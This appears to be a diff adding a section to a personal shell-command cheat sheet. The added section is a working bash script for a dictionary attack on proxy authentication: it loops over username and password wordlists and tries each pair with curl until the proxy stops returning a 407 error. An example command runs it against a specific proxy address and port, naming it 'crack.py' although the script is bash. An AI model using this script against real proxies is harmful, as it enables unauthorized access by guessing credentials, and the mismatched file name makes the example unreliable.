@@ -51,6 +51,28 @@ output
 ```sh
 ./testscript.sh 192.11.183.3 directory.txt
 ```
+## proxy authentication dictionary attk
+```bash
+#!/bin/bash
+  
+while read user
+do
+  while read passwd
+  do
+    content=$(curl -I -x "$user":"$passwd"@$1 $2)
+    echo "$user - $passwd"
+    if echo "$content" | grep -qi "407 proxy authentication required"; then
+      continue
+    else
+      echo "Found usernam-pwd : $user - $passwd"
+      exit 0
+    fi
+  done <$4
+done <$3
+```
+```sh
+$ ./crack.py 192.144.18.3:3128 127.0.0.1  usernames.lst password.lst
+```
 # System Commands
 ## `find`
 ```bash
